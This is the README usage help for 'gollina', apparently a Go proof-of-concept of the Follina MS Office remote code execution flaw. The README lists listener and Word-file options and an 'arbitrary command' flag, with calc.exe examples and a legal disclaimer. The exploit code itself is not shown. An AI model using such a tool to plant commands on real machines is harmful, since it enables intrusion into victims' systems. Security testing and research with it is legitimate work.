```console
$ gollina -h

  gollina
  Follina MS-MSDT 0-day MS Office RCE PoC in Go
  --
  @dwisiswant0

Usage:
  gollina -c [COMMAND] [OPTIONS...]

Options:
  -h, --host        Listener host (default: 0.0.0.0)
  -p, --port        Listener port (default: 8090)
  -n, --name        Word file name (w/o extension, default: gollina)
  -c, --command     Arbitrary command to execute

Examples:
  gollina -c "cmd.exe /c calc.exe"
  gollina -c "cmd.exe /c calc.exe" -p 8080

```

<hr></hr>
<h6 align="center"><small>DISCLAIMER</small></h6>
<h6 align="center"><sub>Usage of this program without prior mutual consent can be considered as an illegal activity. It is the final user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
</sub></h6>